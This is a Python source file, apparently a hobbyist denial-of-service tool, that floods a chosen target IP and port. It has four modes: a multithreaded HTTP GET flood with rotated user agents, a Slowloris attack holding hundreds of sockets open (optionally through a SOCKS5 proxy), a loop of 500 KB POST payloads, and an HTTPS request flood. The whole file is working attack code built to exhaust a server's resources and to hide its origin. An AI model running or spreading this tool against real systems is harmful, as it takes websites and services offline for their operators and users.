import socket
import threading
import argparse
import os
import random
import time
import socks
import ssl

from colorama import Fore, Back, Style
fore_colors = {
	"black": Fore.BLACK,
	"red": Fore.RED,
	"green": Fore.GREEN,
	"yellow": Fore.YELLOW,
	"blue": Fore.BLUE,
	"magenta": Fore.MAGENTA,
	"cyan": Fore.CYAN,
	"white": Fore.WHITE,
	"reset": Fore.RESET
}

back_colors = {
	"black": Back.BLACK,
	"red": Back.RED,
	"green": Back.GREEN,
	"yellow": Back.YELLOW,
	"blue": Back.BLUE,
	"magenta": Back.MAGENTA,
	"cyan": Back.CYAN,
	"white": Back.WHITE,
	"reset": Back.RESET
}

styles = {
	"dim": Style.DIM,
	"normal": Style.NORMAL,
	"bright": Style.BRIGHT,
	"reset": Style.RESET_ALL
}

with open("user_agent/user_agent_lists.txt", 'r', encoding='utf-8') as file:
    user_agents = [line.strip() for line in file if line.strip()]

num_sockets = 200
Y_ANSWER = ["Y", "y", "Yes", "YES", "Ye"]
N_ANSWER = ["N", "n", "No", "NO"]

lock = threading.Lock()

# user_agents = [
#     # Desktop Browsers
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
#     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
#     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",

#     # Mobile Browsers
#     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
#     "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
#     "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",
#     "Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G975F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36",

#     # Bots and Crawlers
#     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
#     "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
#     "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
#     "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
#     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",

#     # Older/Other Browsers
#     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0",
#     "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
#     "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
#     "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",

#     # Bots for testing
#     "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
#     "Twitterbot/1.0",
#     "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",

#     # Miscellaneous
#     "curl/7.64.1",
#     "Wget/1.20.3 (linux-gnu)",
#     "PostmanRuntime/7.28.4",
#     "python-requests/2.28.1",
#     "okhttp/4.9.3",
#     "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
#     "Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.7 (KHTML, like Gecko) NF/4.0.0.10.15 NintendoBrowser/5.1.0.13343",

#     # More Mobile
#     "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
#     "Mozilla/5.0 (Linux; Android 9; SM-J730G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",

#     # Random/Legacy
#     "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
#     "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",

#     # Custom/Generic
#     "Mozilla/5.0 (compatible; AcmeBot/1.0; +http://www.acmebot.com/bot.html)",
# ]

banner = f"""{fore_colors['yellow']}{styles['bright']}                                          
 _    ___         _    _   _          _____     _   _             
|_|==|  _|___=___| |==| |=| |_=======| __  |===| |_| |_=___=_____ 
| |==|  _| -_| -_| |=|   ||   | -_|==|    -| | |  _|   | -_|     |
|_|==|_|=|___|___|_|==|_|=|_|_|___|==|__|__|_  |_| |_|_|___|_|_|_|
===========================================|___|{back_colors['green']}By.=Potter=V3====={back_colors['reset']} {styles['reset']}
    {fore_colors['reset']}"""

help = f"""

{banner}
Options:                        What it do:

  -h, --help                    Show this help menu
  --ip <IP>                     Target IP
  -p, --port <PORT>             Target Port (default: 80)
  -ths, --threads <N>           Number of threads (default: 100)
  -ra, --random-agent           Random User-Agent
  -slowa, --slowloris-attack    Perform Slowloris attack
  -payloada, --payload-attack   Send a JSON file to server
  --proxy-ip <IP>               Use proxy IP
  --proxy-port <PORT>           Use proxy Port

    """

def clear_terminal():
    os.system("clear")

def banner_when_attack(ip, port, threads, amount):
    
    print(banner)
    print(f"""
+-{back_colors['green']}Attacking{back_colors['reset']}---------------------------+
          
{back_colors['cyan']}Target_IP{back_colors['reset']}   : {styles['bright']}{ip}
{back_colors['cyan']}Target-Port{back_colors['reset']} : {port}
{back_colors['cyan']}Threads{back_colors['reset']}     : {threads}
{back_colors['cyan']}Amount{back_colors['reset']}      : {amount}

[{back_colors['green']}+{back_colors['reset']}] Packet sent...
**Ctrl+C to {back_colors['red']}exit{back_colors['reset']}**{styles['reset']}
+-{back_colors['green']}Attacking{back_colors['reset']}---------------------------+
    """)
    # clear_terminal()

parser = argparse.ArgumentParser(description=banner, add_help=False)
parser.add_argument("-h", "--help", action='store_true', dest="help_menu", required=False, help="Help menu")
parser.add_argument("--ip", required=False, help="Target IP")  # ใช้ --ip แทน -ip=
parser.add_argument("-p", "--port", type=int, required=False, default=80, help="Target Port number")  # รองรับ -p หรือ --port
parser.add_argument("-ths", "--threads", type=int, default=100, help="Number of threads to use")
parser.add_argument("-ra", "--random-agent", action='store_true', required=False, help="Random User agent")
parser.add_argument("-slowa", "--slowloris-attack", action='store_true', required=False, help="Slowloris Attack")
parser.add_argument("-payloada", "--payload-attack", required=False, action='store_true' ,help="Send a json file to server")

parser.add_argument("--proxy-ip", required=False, help="Use proxy (ip)")
parser.add_argument("--proxy-port", required=False, type=int, help="Use proxy (port)")


args = parser.parse_args()

help_menu = args.help_menu
target_ip = args.ip
port_target = args.port
num_thread = args.threads
random_user_agent = args.random_agent
payload_req = args.payload_attack

proxy_ip = args.proxy_ip
proxy_port = args.proxy_port

print("Target IP:", target_ip)
print("Target Port:", port_target)
print("Number of Threads:", num_thread)


def check_target(target_ip, target_port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((target_ip, target_port))
        s.close()
        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Target {target_ip}:{target_port} is reachable and open.{styles['reset']}")
        return True
    except socket.timeout:
        print(f"[{back_colors['yellow']}!{back_colors['reset']} {styles['bright']}Timeout: {target_ip}:{target_port} not responding.{styles['reset']}")
    except socket.error as e:
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Connection failed: {e}{styles['reset']}")
    return False


sockets_list = []

def main_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, port_target))

            if args.random_agent:
                user_agent = random.choice(user_agents)
            else:
                user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"

            request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: close\r\n\r\n"
            )

            s.send(request.encode())
            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Packet sent: user-agent > {user_agent}{styles['reset']}")
            s.close()
        except Exception as e:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")

sockets = []

def create_socket():
    s = socks.socksocket()  # สร้าง socket ผ่าน PySocks
    s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
    s.settimeout(4)
    s.connect((target_ip, port_target))
    if args.random_agent:
        user_agent = random.choice(user_agents)
    else:
        user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
    s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n".encode())
    return s

def slowloris_attack_with_proxy():
    print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Starting slowloris attack on {target_ip}:{port_target} via SOCKS5 proxy {proxy_ip}:{proxy_port} with {num_sockets} sockets{styles['reset']}")
    for _ in range(num_sockets):
        try:
            s = create_socket()
            sockets.append(s)
        except Exception as e:
            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Socket creation failed: {e}{styles['reset']}")

    while True:
        for s in sockets[:]:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                sockets.remove(s)
                try:
                    new_s = create_socket()
                    sockets.append(new_s)
                except Exception as e:
                    err_msg = str(e)
                    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {err_msg}{styles['reset']}")
        time.sleep(10)

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, port_target))
        ua = random.choice(user_agents)
        s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\n".encode())
        sockets_list.append(s)
    except Exception as e:
        err_msg = str(e)
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Socket init failed: {err_msg}{styles['reset']}")
        if "No route to host" in err_msg:
            print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Target not reachable - waiting before retry...{styles['reset']}")
            time.sleep(5)  # รอ 5 วินาทีแล้วลองใหม่
        elif "timed out" in err_msg.lower():
            time.sleep(1)  # รอสั้น ๆ แล้วลองใหม่
        else:
            time.sleep(0.5)  # default wait
def slowloris_attack():
    print(f"[{back_colors['green']}+{back_colors['reset']}] {styles["bright"]}Initializing {num_sockets} sockets...{styles['reset']}")
    for _ in range(num_sockets):
        init_socket()
        time.sleep(0.01)

    while True:
        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sending keep-alive headers to {len(sockets_list)} sockets{styles['reset']}")
        for s in sockets_list[:]:
            try:
                s.send(b"X-a: b\r\n")
            except Exception:
                with lock:
                    if s in sockets_list:
                        sockets_list.remove(s)
                try:
                    new_s = init_socket()
                    with lock:
                        sockets_list.append(new_s)
                except Exception as e:
                    err_msg = str(e)
                    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {err_msg}{styles['reset']}")
                    if "No route to host" in err_msg:
                        print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Target not reachable - waiting before retry...{styles['reset']}")
                        time.sleep(5)  # รอ 5 วินาทีแล้วลองใหม่
                    elif "timed out" in err_msg.lower():
                        time.sleep(1)  # รอสั้น ๆ แล้วลองใหม่
                    else:
                        time.sleep(0.5)  # default wait


        # เติม socket ใหม่
        missing = num_sockets - len(sockets_list)
        for _ in range(missing):
            init_socket()

        time.sleep(10)


def send_payload():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port_target))

        if args.random_agent:
                user_agent = random.choice(user_agents)
        else:
            user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"


        big_payload = "A" * 500000  # 500 KB
        req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Content-Length: {len(big_payload)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
            f"{big_payload}"
        )
        s.sendall(req.encode())
        s.close()
        time.sleep(0.1)

def https_attack():
    try:
        # สร้าง TCP socket ปกติ
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(3)
        raw_sock.connect((target_ip, port_target))

        # ห่อด้วย SSL เพื่อให้คุยกับ HTTPS ได้
        context = ssl.create_default_context()
        s = context.wrap_socket(raw_sock, server_hostname=target_ip)

        # เลือก user-agent แบบสุ่ม
        if args.random_agent:
                user_agent = random.choice(user_agents)
        else:
            user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"

        # สร้าง HTTPS request
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Connection: close\r\n\r\n"
        )

        s.send(request.encode())
        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sent HTTPS request with UA: {user_agent}{styles['reset']}")
        s.close()

    except Exception as e:
        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")


def banner_when_attack(ip, port, threads, mode):
    print(f"[{back_colors['yellow']}*{back_colors['reset']}] {styles['bright']}Attacking {ip}:{port} with {threads} threads (mode: {mode}){styles['reset']}")

# Start attack
banner_when_attack(target_ip, port_target, num_thread, "slowloris" if args.slowloris_attack else "main")
if check_target(target_ip, port_target):
    print(f"[{back_colors['green']}*{back_colors['reset']}] {styles['bright']}Checking...{styles['reset']}")
    time.sleep(1)
    for i in range(num_thread):
        if args.help_menu:
            print(help)
            exit()
        
        elif args.slowloris_attack and args.proxy_ip and args.proxy_port:
            t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
        
        elif args.slowloris_attack:
            t = threading.Thread(target=slowloris_attack, daemon=True)


        elif args.payload_attack:
            # are_u_sure = input("Are u sure, it will make ur pc lag(y/n): ")
            # if are_u_sure in Y_ANSWER:
            #     print("Ok....")
            #     time.sleep(2)
            # elif are_u_sure in N_ANSWER:
            #     print("Ok...")
            #     time.sleep(2)
            #     exit()
            # else:
            #     print("WTF!")
            #     exit()
            t = threading.Thread(target=send_payload, daemon=True)

        elif args.port == 443:
            t = threading.Thread(target=https_attack, daemon=True)
        else:
            t = threading.Thread(target=main_attack, daemon=True)
        t.start()
    while True:
        time.sleep(1)

else:
    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Target not reachable. Aborting.{styles['reset']}")

# กัน script หลุด
